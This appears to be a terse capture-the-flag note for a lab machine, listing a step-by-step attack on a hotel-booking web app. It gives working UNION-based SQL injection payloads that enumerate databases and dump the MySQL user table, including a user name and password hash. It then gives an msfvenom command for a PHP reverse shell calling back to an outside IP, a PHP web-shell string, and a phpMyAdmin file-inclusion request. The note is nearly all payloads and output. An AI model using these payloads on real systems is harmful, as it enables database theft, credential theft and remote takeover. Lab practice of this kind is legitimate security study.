### Interesting with no quote needed
`1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL`

### Extract the databases'name(schema_name)
```sql
+UNION+SELECT+"1",group_concat(schema_name),3,4,5,"6","7"+from+information_schema.schemata

schema_name:
hotel,mysql
```

### Extract the tables'name(table_name)
```sql
+UNION+SELECT+"1",group_concat(table_name),3,4,5,"6","7"+fRoM+information_schema.tables+wHeRe+table_schema='hotel'

room
```
```sql
+UNION+SELECT+"1",group_concat(table_name),3,4,5,"6","7"+fRoM+information_schema.tables+wHeRe+table_schema='mysql'
```
<a href="/room.php?cod=1">column_stats,columns_priv,db,event,func,general_log,gtid_slave_pos,help_category,help_keyword,help_relation,help_topic,host,index_stats,innodb_index_stats,innodb_table_stats,plugin,proc,procs_priv,proxies_priv,roles_mapping,servers,slow_log,table_stats,tables_priv,time_zone,time_zone_leap_second,time_zone_name,time_zone_transition,time_zone_transition_type,user</a>


### Extract the columns'name(column_name)
```sql
+UNION+SELECT+"1",group_concat(column_name),3,4,5,"6","7"+fRoM+information_schema.columns+wHeRe+table_name='room'
```
cod,name,price,descrip,star,image,mini

```sql
+UNION+SELECT+"1",group_concat(column_name),3,4,5,"6","7"+fRoM+information_schema.columns+wHeRe+table_name='user'
```
<a href="/room.php?cod=1">Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Create_user_priv,Event_priv,Trigger_priv,Create_tablespace_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,max_updates,max_connections,max_user_connections,plugin,authentication_string,password_expired,is_role,default_role,max_statement_time</a>

### Exfiltrate data
```sql
+UNION+SELECT+"1",User,3,Password,5,"6","7"+fRoM+mysql.user
```
DBadmin
2D2B7A5E4E637B8FBA1D17F40318F277D29964D0

### Payload
```bash
msfvenom --platform php -a php -e php/base64 -p php/reverse_php LHOST=10.10.16.9 LPORT=443 -o payload.php
```

##### Manual way
https://www.exploit-db.com/exploits/44928
```sql
select '<?php system($_GET["cmd"]);?>'
```

```
/index.php?cmd=id&target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_vg87dt831jhjn1v9r67n5lqm819iidfh
```


https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html#path-1-phpmyadmin